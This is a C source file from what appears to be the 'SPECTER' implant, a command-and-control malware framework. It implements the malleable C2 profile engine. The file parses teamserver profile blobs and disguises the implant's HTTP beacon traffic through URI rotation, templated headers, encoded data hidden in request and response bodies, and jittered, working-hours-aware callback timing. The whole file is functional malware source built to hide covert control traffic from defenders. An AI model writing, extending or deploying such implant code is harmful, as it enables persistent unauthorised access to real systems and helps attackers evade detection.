/**
 * SPECTER Implant — Malleable C2 Profile Engine
 *
 * Parses TLV-encoded binary profile blobs from the teamserver into
 * PROFILE_CONFIG. Drives HTTP request/response shaping including URI
 * rotation, header construction with template expansion, and payload
 * data embedding/extraction via configurable embed points.
 */

#include "specter.h"
#include "ntdefs.h"
#include "profile.h"
#include "util.h"

/* ------------------------------------------------------------------ */
/*  PRNG (shared with sleep.c pattern — LCG for jitter/random)         */
/* ------------------------------------------------------------------ */

static DWORD g_profile_prng = 0x50524F46; /* "PROF" */

#ifdef TEST_BUILD
static DWORD g_test_prng_seed = 0;
static BOOL  g_test_prng_set = FALSE;
#endif

static DWORD profile_prng_next(void) {
#ifdef TEST_BUILD
    if (g_test_prng_set) {
        g_test_prng_seed = g_test_prng_seed * 1103515245 + 12345;
        return (g_test_prng_seed >> 16) & 0x7FFF;
    }
#endif
    g_profile_prng = g_profile_prng * 1103515245 + 12345;
    return (g_profile_prng >> 16) & 0x7FFF;
}

/* ------------------------------------------------------------------ */
/*  Internal helpers — little-endian reads                              */
/* ------------------------------------------------------------------ */

static WORD load16_le(const BYTE *p) {
    return (WORD)p[0] | ((WORD)p[1] << 8);
}

/* load64_le provided by util.h */

/* ------------------------------------------------------------------ */
/*  Internal helpers — string copy with bounds                          */
/* ------------------------------------------------------------------ */

static void safe_copy(char *dst, DWORD dst_size, const BYTE *src, DWORD src_len) {
    DWORD copy = src_len;
    if (copy >= dst_size)
        copy = dst_size - 1;
    spec_memcpy(dst, src, copy);
    dst[copy] = '\0';
}

/* ------------------------------------------------------------------ */
/*  Internal helpers — hex char helpers                                 */
/* ------------------------------------------------------------------ */

static const char g_hex_chars[] = "0123456789abcdef";

static void write_random_hex(char *out, DWORD count) {
    for (DWORD i = 0; i < count; i++) {
        DWORD r = profile_prng_next();
        out[i] = g_hex_chars[r & 0x0F];
    }
}

/* ------------------------------------------------------------------ */
/*  Internal helpers — integer to decimal string                        */
/* ------------------------------------------------------------------ */

static DWORD uint_to_dec(DWORD val, char *buf, DWORD buf_size) {
    if (buf_size == 0) return 0;
    char tmp[12];
    DWORD len = 0;
    if (val == 0) {
        if (buf_size < 2) return 0;
        buf[0] = '0'; buf[1] = '\0';
        return 1;
    }
    while (val > 0 && len < sizeof(tmp)) {
        tmp[len++] = '0' + (char)(val % 10);
        val /= 10;
    }
    if (len >= buf_size) return 0;
    for (DWORD i = 0; i < len; i++)
        buf[i] = tmp[len - 1 - i];
    buf[len] = '\0';
    return len;
}

/* ------------------------------------------------------------------ */
/*  Base64 encode/decode (used for embed point encoding)                */
/* ------------------------------------------------------------------ */

/* b64 table provided by util.h as util_b64_table */

static DWORD b64_encode(const BYTE *in, DWORD in_len, char *out, DWORD out_size) {
    DWORD needed = ((in_len + 2) / 3) * 4;
    if (needed >= out_size) return 0;

    DWORD oi = 0;
    DWORD i = 0;
    while (i + 2 < in_len) {
        DWORD v = ((DWORD)in[i] << 16) | ((DWORD)in[i+1] << 8) | in[i+2];
        out[oi++] = util_b64_table[(v >> 18) & 0x3F];
        out[oi++] = util_b64_table[(v >> 12) & 0x3F];
        out[oi++] = util_b64_table[(v >>  6) & 0x3F];
        out[oi++] = util_b64_table[v & 0x3F];
        i += 3;
    }
    if (i < in_len) {
        DWORD v = (DWORD)in[i] << 16;
        if (i + 1 < in_len) v |= (DWORD)in[i+1] << 8;
        out[oi++] = util_b64_table[(v >> 18) & 0x3F];
        out[oi++] = util_b64_table[(v >> 12) & 0x3F];
        out[oi++] = (i + 1 < in_len) ? util_b64_table[(v >> 6) & 0x3F] : '=';
        out[oi++] = '=';
    }
    out[oi] = '\0';
    return oi;
}

/* profile_b64_decode_char: wrapper around util_b64_decode_char.
   Profile code uses 0xFF for invalid; util version returns -1.
   Callers compare against 0xFF, so map accordingly. */
static inline BYTE profile_b64_decode_char(char c) {
    int v = util_b64_decode_char(c);
    return (v < 0) ? 0xFF : (BYTE)v;
}

static DWORD b64_decode(const char *in, DWORD in_len, BYTE *out, DWORD out_size) {
    /* Strip trailing padding for length calc */
    DWORD pad = 0;
    if (in_len >= 1 && in[in_len - 1] == '=') pad++;
    if (in_len >= 2 && in[in_len - 2] == '=') pad++;

    DWORD out_len = (in_len / 4) * 3 - pad;
    if (out_len > out_size) return 0;

    DWORD oi = 0;
    for (DWORD i = 0; i + 3 < in_len; i += 4) {
        BYTE a = profile_b64_decode_char(in[i]);
        BYTE b = profile_b64_decode_char(in[i+1]);
        BYTE c = profile_b64_decode_char(in[i+2]);
        BYTE d = profile_b64_decode_char(in[i+3]);
        if (a == 0xFF || b == 0xFF) return 0;

        DWORD v = ((DWORD)a << 18) | ((DWORD)b << 12);
        if (c != 0xFF) v |= ((DWORD)c << 6);
        if (d != 0xFF) v |= (DWORD)d;

        if (oi < out_size) out[oi++] = (BYTE)(v >> 16);
        if (in[i+2] != '=' && oi < out_size) out[oi++] = (BYTE)(v >> 8);
        if (in[i+3] != '=' && oi < out_size) out[oi++] = (BYTE)(v);
    }
    return oi;
}

/* ------------------------------------------------------------------ */
/*  Hex encode/decode                                                   */
/* ------------------------------------------------------------------ */

static DWORD hex_encode_buf(const BYTE *in, DWORD in_len, char *out, DWORD out_size) {
    DWORD needed = in_len * 2;
    if (needed >= out_size) return 0;
    for (DWORD i = 0; i < in_len; i++) {
        out[i * 2]     = g_hex_chars[(in[i] >> 4) & 0x0F];
        out[i * 2 + 1] = g_hex_chars[in[i] & 0x0F];
    }
    out[needed] = '\0';
    return needed;
}

static BYTE hex_val(char c) {
    if (c >= '0' && c <= '9') return (BYTE)(c - '0');
    if (c >= 'a' && c <= 'f') return (BYTE)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (BYTE)(c - 'A' + 10);
    return 0xFF;
}

static DWORD hex_decode_buf(const char *in, DWORD in_len, BYTE *out, DWORD out_size) {
    if (in_len % 2 != 0) return 0;
    DWORD out_len = in_len / 2;
    if (out_len > out_size) return 0;
    for (DWORD i = 0; i < out_len; i++) {
        BYTE hi = hex_val(in[i * 2]);
        BYTE lo = hex_val(in[i * 2 + 1]);
        if (hi == 0xFF || lo == 0xFF) return 0;
        out[i] = (hi << 4) | lo;
    }
    return out_len;
}

/* ------------------------------------------------------------------ */
/*  Encode/decode data per embed encoding                               */
/* ------------------------------------------------------------------ */

static DWORD embed_encode(DWORD encoding, const BYTE *data, DWORD len,
                           char *out, DWORD out_size) {
    switch (encoding) {
    case EMBED_ENC_BASE64:
        return b64_encode(data, len, out, out_size);
    case EMBED_ENC_HEX:
        return hex_encode_buf(data, len, out, out_size);
    case EMBED_ENC_RAW:
    default:
        if (len >= out_size) return 0;
        spec_memcpy(out, data, len);
        out[len] = '\0';
        return len;
    }
}

static DWORD embed_decode(DWORD encoding, const char *data, DWORD len,
                           BYTE *out, DWORD out_size) {
    switch (encoding) {
    case EMBED_ENC_BASE64:
        return b64_decode(data, len, out, out_size);
    case EMBED_ENC_HEX:
        return hex_decode_buf(data, len, out, out_size);
    case EMBED_ENC_RAW:
    default:
        if (len > out_size) return 0;
        spec_memcpy(out, data, len);
        return len;
    }
}

/* ------------------------------------------------------------------ */
/*  TLV parser — parse embed point from binary                          */
/* ------------------------------------------------------------------ */

static void parse_embed_point(const BYTE *data, DWORD len, EMBED_POINT *ep) {
    if (len < 3) return;
    ep->location = data[0];
    ep->encoding = data[1];
    BYTE name_len = data[2];
    if (name_len > 0 && (DWORD)(3 + name_len) <= len) {
        safe_copy(ep->field_name, sizeof(ep->field_name), data + 3, name_len);
    }
}

/* ------------------------------------------------------------------ */
/*  profile_init — TLV blob parser                                     */
/* ------------------------------------------------------------------ */

NTSTATUS profile_init(const BYTE *blob, DWORD blob_len, PROFILE_CONFIG *cfg_out) {
    if (!blob || blob_len == 0 || !cfg_out)
        return STATUS_INVALID_PARAMETER;

    spec_memset(cfg_out, 0, sizeof(PROFILE_CONFIG));

    DWORD pos = 0;
    while (pos + 3 <= blob_len) {
        BYTE fid = blob[pos];
        WORD vlen = load16_le(blob + pos + 1);
        pos += 3;

        if (pos + vlen > blob_len)
            break; /* Truncated TLV — stop parsing */

        const BYTE *val = blob + pos;

        switch (fid) {
        /* ---- Profile metadata ---- */
        case TLV_PROFILE_NAME:
            safe_copy(cfg_out->name, sizeof(cfg_out->name), val, vlen);
            break;

        /* ---- HTTP request fields ---- */
        case TLV_HTTP_REQ_METHOD:
            safe_copy(cfg_out->request.method, sizeof(cfg_out->request.method), val, vlen);
            break;

        case TLV_HTTP_REQ_URI_PATTERN:
            if (cfg_out->request.uri_count < PROFILE_MAX_URIS) {
                safe_copy(cfg_out->request.uri_patterns[cfg_out->request.uri_count],
                          PROFILE_MAX_URI_LEN, val, vlen);
                cfg_out->request.uri_count++;
            }
            break;

        case TLV_HTTP_REQ_HEADER:
            if (cfg_out->request.header_count < PROFILE_MAX_HEADERS) {
                safe_copy(cfg_out->request.headers[cfg_out->request.header_count],
                          PROFILE_MAX_HEADER_LEN, val, vlen);
                cfg_out->request.header_count++;
            }
            break;

        case TLV_HTTP_REQ_BODY_TMPL:
            safe_copy(cfg_out->request.body_template, sizeof(cfg_out->request.body_template),
                      val, vlen);
            break;

        case TLV_HTTP_REQ_EMBED_POINT:
            if (cfg_out->request.embed_count < PROFILE_MAX_EMBED_POINTS) {
                parse_embed_point(val, vlen,
                    &cfg_out->request.embed_points[cfg_out->request.embed_count]);
                cfg_out->request.embed_count++;
            }
            break;

        /* ---- HTTP response fields ---- */
        case TLV_HTTP_RESP_STATUS:
            if (vlen >= 2) cfg_out->response.status_code = load16_le(val);
            break;

        case TLV_HTTP_RESP_HEADER:
            if (cfg_out->response.header_count < PROFILE_MAX_HEADERS) {
                safe_copy(cfg_out->response.headers[cfg_out->response.header_count],
                          PROFILE_MAX_HEADER_LEN, val, vlen);
                cfg_out->response.header_count++;
            }
            break;

        case TLV_HTTP_RESP_BODY_TMPL:
            safe_copy(cfg_out->response.body_template, sizeof(cfg_out->response.body_template),
                      val, vlen);
            break;

        case TLV_HTTP_RESP_EMBED_POINT:
            if (cfg_out->response.embed_count < PROFILE_MAX_EMBED_POINTS) {
                parse_embed_point(val, vlen,
                    &cfg_out->response.embed_points[cfg_out->response.embed_count]);
                cfg_out->response.embed_count++;
            }
            break;

        case TLV_HTTP_RESP_ERROR_RATE:
            if (vlen >= 2) cfg_out->response.error_rate = load16_le(val);
            break;

        /* ---- URI rotation ---- */
        case TLV_HTTP_URI_ROTATION:
            if (vlen >= 1) cfg_out->uri_rotation = val[0];
            break;

        /* ---- Timing ---- */
        case TLV_TIMING_INTERVAL:
            if (vlen >= 8) cfg_out->timing.callback_interval = load64_le(val);
            break;

        case TLV_TIMING_JITTER_DIST:
            if (vlen >= 1) cfg_out->timing.jitter_distribution = val[0];
            break;

        case TLV_TIMING_JITTER_PCT:
            if (vlen >= 2) cfg_out->timing.jitter_pct_100 = load16_le(val);
            break;

        case TLV_TIMING_WORKING_HOURS:
            if (vlen >= 5) {
                cfg_out->timing.working_hours.start_hour = val[0];
                cfg_out->timing.working_hours.end_hour = val[1];
                cfg_out->timing.working_hours.day_mask = val[2];
                cfg_out->timing.working_hours.off_hours_mult_100 = load16_le(val + 3);
                cfg_out->timing.has_working_hours = TRUE;
            }
            break;

        case TLV_TIMING_BURST_WINDOW:
            if (vlen >= 10 && cfg_out->timing.burst_count < PROFILE_MAX_BURST_WINDOWS) {
                BURST_WINDOW *bw = &cfg_out->timing.burst_windows[cfg_out->timing.burst_count];
                bw->start_hour = val[0];
                bw->end_hour = val[1];
                bw->interval_override = load64_le(val + 2);
                cfg_out->timing.burst_count++;
            }
            break;

        case TLV_TIMING_INITIAL_DELAY:
            if (vlen >= 8) cfg_out->timing.initial_delay = load64_le(val);
            break;

        /* ---- Transform chain ---- */
        case TLV_TRANSFORM_COMPRESS:
            if (vlen >= 1) cfg_out->transform.compress = val[0];
            break;

        case TLV_TRANSFORM_ENCRYPT:
            if (vlen >= 1) cfg_out->transform.encrypt = val[0];
            break;

        case TLV_TRANSFORM_ENCODE:
            if (vlen >= 1) cfg_out->transform.encode = val[0];
            break;

        default:
            /* Unknown field — skip */
            break;
        }

        pos += vlen;
    }

    cfg_out->uri_index = 0;
    cfg_out->initialized = TRUE;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  profile_get_uri                                                    */
/* ------------------------------------------------------------------ */

const char *profile_get_uri(PROFILE_CONFIG *cfg) {
    if (!cfg || !cfg->initialized || cfg->request.uri_count == 0)
        return "/";

    DWORD idx;
    switch (cfg->uri_rotation) {
    case URI_ROTATION_RANDOM:
        idx = profile_prng_next() % cfg->request.uri_count;
        break;
    case URI_ROTATION_ROUNDROBIN:
        idx = cfg->uri_index;
        cfg->uri_index = (cfg->uri_index + 1) % cfg->request.uri_count;
        break;
    case URI_ROTATION_SEQUENTIAL:
    default:
        idx = cfg->uri_index;
        if (cfg->uri_index < cfg->request.uri_count - 1)
            cfg->uri_index++;
        break;
    }

    return cfg->request.uri_patterns[idx];
}

/* ------------------------------------------------------------------ */
/*  profile_get_method                                                 */
/* ------------------------------------------------------------------ */

DWORD profile_get_method(PROFILE_CONFIG *cfg) {
    if (!cfg || !cfg->initialized)
        return 1; /* POST */
    if (cfg->request.method[0] == 'G' || cfg->request.method[0] == 'g')
        return 0; /* GET */
    return 1; /* POST */
}

/* ------------------------------------------------------------------ */
/*  Template expansion helpers                                         */
/* ------------------------------------------------------------------ */

/**
 * Expand a template string, replacing:
 *   {{timestamp}} → current Unix-ish timestamp (checkin_count used as proxy)
 *   {{random_hex(N)}} → N random hex characters
 *   {{data}} → the provided data_str (or empty if NULL)
 * Returns bytes written.
 */
static DWORD expand_template(const char *tmpl, const char *data_str,
                              char *out, DWORD out_size) {
    DWORD oi = 0;
    DWORD ti = 0;
    DWORD tmpl_len = (DWORD)spec_strlen(tmpl);

    while (ti < tmpl_len && oi < out_size - 1) {
        if (ti + 1 < tmpl_len && tmpl[ti] == '{' && tmpl[ti+1] == '{') {
            /* Find closing }} */
            DWORD end = ti + 2;
            while (end + 1 < tmpl_len && !(tmpl[end] == '}' && tmpl[end+1] == '}'))
                end++;
            if (end + 1 >= tmpl_len) {
                /* No closing — copy literal */
                out[oi++] = tmpl[ti++];
                continue;
            }

            /* Extract variable name */
            const char *var = tmpl + ti + 2;
            DWORD var_len = end - (ti + 2);

            if (var_len == 4 && spec_memcmp(var, "data", 4) == 0) {
                if (data_str) {
                    DWORD dl = (DWORD)spec_strlen(data_str);
                    DWORD copy = dl;
                    if (oi + copy >= out_size) copy = out_size - oi - 1;
                    spec_memcpy(out + oi, data_str, copy);
                    oi += copy;
                }
            } else if (var_len == 9 && spec_memcmp(var, "timestamp", 9) == 0) {
                /* Use PRNG-derived value as timestamp proxy */
                DWORD ts = profile_prng_next() * 100000 + 1700000000;
                char ts_str[12];
                DWORD ts_len = uint_to_dec(ts, ts_str, sizeof(ts_str));
                if (oi + ts_len < out_size) {
                    spec_memcpy(out + oi, ts_str, ts_len);
                    oi += ts_len;
                }
            } else if (var_len > 11 && spec_memcmp(var, "random_hex(", 11) == 0) {
                /* Parse count from random_hex(N) */
                DWORD count = 0;
                for (DWORD j = 11; j < var_len && var[j] >= '0' && var[j] <= '9'; j++)
                    count = count * 10 + (var[j] - '0');
                if (count > 0 && oi + count < out_size) {
                    write_random_hex(out + oi, count);
                    oi += count;
                }
            } else {
                /* Unknown variable — copy literal */
                DWORD copy = end + 2 - ti;
                if (oi + copy >= out_size) copy = out_size - oi - 1;
                spec_memcpy(out + oi, tmpl + ti, copy);
                oi += copy;
            }

            ti = end + 2;
        } else {
            out[oi++] = tmpl[ti++];
        }
    }

    out[oi] = '\0';
    return oi;
}

/* ------------------------------------------------------------------ */
/*  profile_build_headers                                              */
/* ------------------------------------------------------------------ */

DWORD profile_build_headers(PROFILE_CONFIG *cfg, char *output, DWORD max_len) {
    if (!cfg || !cfg->initialized || !output || max_len == 0)
        return 0;

    DWORD pos = 0;
    for (DWORD i = 0; i < cfg->request.header_count; i++) {
        /* Expand template variables in header value */
        char expanded[PROFILE_MAX_HEADER_LEN];
        DWORD elen = expand_template(cfg->request.headers[i], NULL,
                                      expanded, sizeof(expanded));
        if (elen == 0) continue;

        /* Append header + CRLF */
        if (pos + elen + 2 >= max_len) break;
        spec_memcpy(output + pos, expanded, elen);
        pos += elen;
        output[pos++] = '\r';
        output[pos++] = '\n';
    }

    output[pos] = '\0';
    return pos;
}

/* ------------------------------------------------------------------ */
/*  profile_embed_data                                                 */
/* ------------------------------------------------------------------ */

DWORD profile_embed_data(PROFILE_CONFIG *cfg, const BYTE *data, DWORD data_len,
                          BYTE *body_out, DWORD max_len) {
    if (!cfg || !cfg->initialized || !body_out || max_len == 0)
        return 0;

    /* If no body template, just put raw encoded data */
    if (cfg->request.body_template[0] == '\0') {
        if (cfg->request.embed_count > 0) {
            return embed_encode(cfg->request.embed_points[0].encoding,
                                data, data_len, (char *)body_out, max_len);
        }
        /* No template, no embed points — raw copy */
        if (data_len > max_len) return 0;
        spec_memcpy(body_out, data, data_len);
        return data_len;
    }

    /* Encode data per first embed point */
    char encoded_data[4096];
    if (cfg->request.embed_count > 0) {
        embed_encode(cfg->request.embed_points[0].encoding,
                     data, data_len, encoded_data, sizeof(encoded_data));
    } else {
        b64_encode(data, data_len, encoded_data, sizeof(encoded_data));
    }

    /* Expand body template with encoded data in {{data}} */
    char body_str[4096];
    DWORD body_len = expand_template(cfg->request.body_template,
                                      encoded_data, body_str, sizeof(body_str));

    if (body_len == 0 || body_len > max_len) return 0;
    spec_memcpy(body_out, body_str, body_len);
    return body_len;
}

/* ------------------------------------------------------------------ */
/*  profile_extract_data                                               */
/* ------------------------------------------------------------------ */

/**
 * Find a JSON string value by key in a simple JSON object.
 * Returns pointer to the value string (after opening quote),
 * and sets *value_len to the length (not including quotes).
 */
static const char *json_find_string(const char *json, DWORD json_len,
                                     const char *key, DWORD *value_len) {
    DWORD key_len = (DWORD)spec_strlen(key);

    for (DWORD i = 0; i + key_len + 3 < json_len; i++) {
        if (json[i] == '"' &&
            spec_memcmp(json + i + 1, key, key_len) == 0 &&
            json[i + 1 + key_len] == '"') {
            /* Found key — look for colon then value */
            DWORD j = i + 2 + key_len;
            while (j < json_len && (json[j] == ' ' || json[j] == ':' || json[j] == '\t'))
                j++;
            if (j < json_len && json[j] == '"') {
                j++; /* skip opening quote */
                DWORD start = j;
                while (j < json_len && json[j] != '"')
                    j++;
                *value_len = j - start;
                return json + start;
            }
        }
    }

    *value_len = 0;
    return NULL;
}

DWORD profile_extract_data(PROFILE_CONFIG *cfg, const BYTE *body, DWORD body_len,
                            BYTE *data_out, DWORD *data_len_out) {
    if (!cfg || !cfg->initialized || !body || body_len == 0 || !data_out || !data_len_out)
        return 0;

    *data_len_out = 0;

    /* Use response embed points */
    if (cfg->response.embed_count == 0) {
        /* No embed points — treat entire body as raw data */
        if (body_len > 4096) return 0;
        spec_memcpy(data_out, body, body_len);
        *data_len_out = body_len;
        return body_len;
    }

    EMBED_POINT *ep = &cfg->response.embed_points[0];

    if (ep->location == EMBED_JSON_FIELD && ep->field_name[0] != '\0') {
        /* Extract from JSON field */
        DWORD val_len = 0;
        const char *val = json_find_string((const char *)body, body_len,
                                            ep->field_name, &val_len);
        if (!val || val_len == 0) return 0;

        DWORD decoded = embed_decode(ep->encoding, val, val_len,
                                      data_out, 4096);
        *data_len_out = decoded;
        return decoded;
    }

    /* Fallback: treat body as encoded data */
    DWORD decoded = embed_decode(ep->encoding, (const char *)body, body_len,
                                  data_out, 4096);
    *data_len_out = decoded;
    return decoded;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void profile_test_set_prng_seed(DWORD seed) {
    g_test_prng_seed = seed;
    g_test_prng_set = TRUE;
}
#endif
